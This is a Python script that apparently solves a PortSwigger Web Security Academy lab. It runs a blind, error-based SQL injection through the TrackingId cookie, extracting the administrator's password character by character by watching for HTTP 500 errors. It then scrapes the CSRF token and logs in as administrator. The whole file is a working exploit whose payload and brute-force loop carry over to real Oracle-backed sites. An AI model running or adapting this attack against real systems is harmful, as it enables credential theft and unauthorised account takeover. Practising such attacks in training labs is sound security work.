import requests
import string
from bs4 import BeautifulSoup

URL = "https://0a3900dc04c08f1cc04d04b100bf00c7.web-security-academy.net/"
loginURL = "https://0a3900dc04c08f1cc04d04b100bf00c7.web-security-academy.net/login"
cookies = {'TrackingId':'', 'session':'OrKEHkQzuoo7koGAxSSErd62ddbN9bB5'}
TrackingId = "OMw1xjatqzdeHfyr"
# proxies = {"https":"http://127.0.0.1:8080"}

all_letter_num = string.ascii_letters + string.digits
quit = False
index = 0
password = ""

print("Using payload: TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='x' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'")
print("[+] Dumping 'administrator' password: ", end="")
# print("Dumping administrator username")
while(quit == False):
	found = False
	index = index + 1
	# print("Trying index pos: {}".format(index))
	for char in all_letter_num:

		#' and (select(substring(password,1,1) from users where username='administrator')='a
		payload = "'||(SELECT CASE WHEN SUBSTR(password,{},1)='{}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'".format(index,char)
		cookies['TrackingId'] = TrackingId+payload

		# res = requests.get(URL, cookies=cookies, proxies=proxies, verify=False)
		res = requests.get(URL, cookies=cookies)

		# if "Welcome" in res.text:
		if res.status_code == 500:
			password = password + char
			print(char, end="",flush=True)
			found = True
			break

		if (found == False) and "9" in char:
			quit = True
			print("")
			print("[-] End")


#---login with found credentials--------------------------------------------------
if len(password) > 0:
	print("\nAttempt to login with credentials...")
	print("finding csrf token... ")
	html_content = requests.get(url = loginURL, cookies=cookies).text
	soup = BeautifulSoup(html_content, "html.parser")
	csrf_token = soup.find('input', {'name':'csrf'})['value']
	print(" [+] csrf token found! : {}".format(csrf_token))
	print("\nLoggin in... ")

	# data body
	# csrf=7XVCXSjAhQbU9Osbin89zpr0tCQUQVXn&username=test&password=pw
	data = "csrf={}&username={}&password={}".format(csrf_token,"administrator",password)
	res = requests.post(url = loginURL, data = data, cookies=cookies)

	#if login is successful you will see 'Log out' 
	if "Log out" in res.text:
		print(" [+] Successfully logged in!")
